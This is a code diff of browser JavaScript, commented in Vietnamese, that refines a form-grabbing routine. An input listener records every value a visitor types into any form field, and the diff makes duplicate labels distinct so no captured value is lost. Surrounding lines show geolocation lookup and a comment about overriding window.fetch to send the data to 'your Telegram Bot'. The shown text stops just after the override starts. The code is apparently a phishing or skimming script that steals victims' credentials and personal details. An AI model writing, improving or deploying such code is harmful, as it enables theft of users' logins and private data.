@@ -57,22 +57,36 @@
   loadGeoDetails();
 
   // 3. Ghi nhận tự động các trường mặc định trên form gốc
-  document.addEventListener('input', function(e) {
-    const el = e.target;
-    if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
-      const label =
-  el.labels?.[0]?.textContent.trim() ||  // chữ trong thẻ <label for="...">
-  el.getAttribute('aria-label') ||        // aria-label
-  el.placeholder ||
-  el.name ||
-  el.id ||
-  el.type ||
-  'Field';
-      if (el.value.trim() !== '') {
-        capturedFields[label] = el.value.trim();
-      }
+  let fieldSeq = 0;
+const labelCount = {};
+const capturedFields = {};
+
+document.addEventListener('input', function(e) {
+  const el = e.target;
+  if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
+
+    // Mỗi element chỉ tính key MỘT lần, rồi nhớ luôn vào el._capKey
+    if (!el._capKey) {
+      let label =
+        el.labels?.[0]?.textContent.trim() ||  // chữ trong thẻ <label for="...">
+        el.getAttribute('aria-label') ||        // aria-label
+        el.placeholder ||
+        el.name ||
+        el.id ||
+        el.type ||
+        'Field';
+
+      labelCount[label] = (labelCount[label] || 0) + 1;
+      if (labelCount[label] > 1) label += ` (${labelCount[label]})`;
+
+      el._capKey = label;   // ghi nhớ trên chính element
     }
-  }, true);
+
+    if (el.value.trim() !== '') {
+      capturedFields[el._capKey] = el.value.trim();
+    }
+  }
+}, true);
 
   // 4. Chặn API gốc và gửi về Telegram Bot của bạn
   window.fetch = async function(url, options) {
